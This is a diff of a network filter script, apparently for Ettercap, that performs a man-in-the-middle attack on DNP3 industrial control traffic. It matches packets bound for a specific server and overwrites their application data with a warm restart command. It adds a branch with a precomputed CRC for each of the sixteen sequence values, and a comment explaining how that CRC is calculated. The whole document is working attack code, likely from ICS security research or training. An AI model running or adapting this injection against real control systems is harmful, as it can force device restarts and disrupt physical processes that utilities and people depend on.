@@ -5,6 +5,13 @@
 # Created by: Don C. Weber (@cutaway)
 # Date Created: November 2022
 # Version: 0.1
+# 
+# Calculating DNP3 CRC using Python
+# import crcmod.predefined
+# crcdnp = crcmod.predefined.mkCrcFun('crc-16-dnp')
+# data = '\xc0\xc0\x0e'
+# hex(crcdnp(bytes.fromhex(data)))
+# '0xdc7e' <- Output. Flip these bytes for the packet data '\x7e\xdc' 
 ###########################################
 
 # Checking to see if the destination is the server and the protocol is DNP3
@@ -12,9 +19,71 @@
 if (ip.dst == '192.168.0.21' && tcp.src == 20000) {
 
 	# Check for DNP3 message and a DNP3 data with Application control of sequence 0x00. 
-    if (DATA.data == "\x05\x64" && DATA.data + 11 == "\xc0"){
-        # Overwrite DNP3 packet data by replacing everything
-        pcre_regex(DATA.data + 10,"*", "\xc0\xc0\x0e\x7e\xdc");
+    if (DATA.data == "\x05\x64"){
+            if (DATA.data + 11 == "\xc0"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc0\x0e\x7e\xdc");
+            }
+            if (DATA.data + 11 == "\xc1"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc1\x0e\x30\x77");
+            }
+            if (DATA.data + 11 == "\xc2"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc2\x0e\x9b\xc7");
+            }
+            if (DATA.data + 11 == "\xc3"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc3\x0e\xd5\x6c");
+            }
+            if (DATA.data + 11 == "\xc4"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc4\x0e\xb4\xeb");
+            }
+            if (DATA.data + 11 == "\xc5"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc5\x0e\xfa\x40");
+            }
+            if (DATA.data + 11 == "\xc6"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc6\x0e\x51\xf0");
+            }
+            if (DATA.data + 11 == "\xc7"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc7\x0e\x1f\x5b");
+            }
+            if (DATA.data + 11 == "\xc8"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc8\x0e\xea\xb3");
+            }
+            if (DATA.data + 11 == "\xc9"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xc9\x0e\xa4\x18");
+            }
+            if (DATA.data + 11 == "\xca"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xca\x0e\x0f\xa8");
+            }
+            if (DATA.data + 11 == "\xcb"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xcb\x0e\x41\x03");
+            }
+            if (DATA.data + 11 == "\xcc"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xcc\x0e\x20\x84");
+            }
+            if (DATA.data + 11 == "\xcd"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xcd\x0e\x6e\x2f");
+            }
+            if (DATA.data + 11 == "\xce"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xce\x0e\xc5\x9f");
+            }
+            if (DATA.data + 11 == "\xcf"){
+                # Overwrite DNP3 packet data by replacing everything
+                pcre_regex(DATA.data + 10,"*", "\xc0\xcf\x0e\x8b\x34");
+            }
     	# Printing a message when the filter fires.
     	msg("Updated DNP3 data with \xc0\xc0\x0e\x7e\xdc for a warm restart");
     }
